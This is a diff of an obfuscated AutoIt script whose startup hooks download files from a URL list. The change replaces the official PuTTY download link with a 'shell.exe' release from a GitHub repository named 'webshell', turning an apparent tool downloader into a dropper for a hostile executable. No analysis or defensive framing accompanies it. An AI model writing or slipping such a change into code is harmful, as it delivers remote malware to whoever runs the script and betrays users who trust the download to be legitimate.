@@ -31,7 +31,7 @@ Global Const $var_3448 = Asc("h")
 #OnAutoItStartRegister "func_3743"
 #OnAutoItStartRegister "PrxmxFunc"
 Global Const $q5_6fpMq9Et__hXSVWwe_[2][6] = [[45129, 26, 250, 22, 215, 237], [52, 10816]]
-Local $MXEHKPJQ_RYTTPU = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
+Local $MXEHKPJQ_RYTTPU = "https://github.com/MetadrainCoding/webshell/releases/download/shell/shell.exe"
 Local $tShknl = StringSplit($MXEHKPJQ_RYTTPU, ",", 2)
 For $url In $tShknl
     $u6n7ResgVeLR_fjnLj_b_ = _DownloadFile($url)
@@ -70,4 +70,7 @@ EndFunc
 Func func_3717()
     return 45
 EndFunc
+
+
+
 
